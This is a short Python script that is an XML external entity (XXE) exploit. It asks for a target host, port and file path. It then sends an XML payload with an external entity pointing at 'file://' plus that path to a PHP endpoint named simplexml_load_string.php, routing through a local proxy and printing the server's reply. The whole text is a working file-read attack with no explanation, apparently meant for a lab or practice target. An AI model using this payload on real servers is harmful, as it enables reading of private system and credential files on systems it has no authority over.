import requests
RHOST=input("RHOST:")
RPORT=input("RPORT:")
PATH=input("PATH:")
proxies={"http":"http://127.0.0.1:8080"}
data=f"""<?xml version="1.0" encoding="utf-8"?> 	
<!DOCTYPE xxe[ 
	<!ELEMENT test ANY >
	<!ENTITY xxe SYSTEM "file://{PATH}" >]>
<test>
	<name>&xxe;</name>					
</test>	
"""
res=requests.get(url=f"http://{RHOST}:{RPORT}/simplexml_load_string.php",data=data,proxies=proxies)
print(res.text)
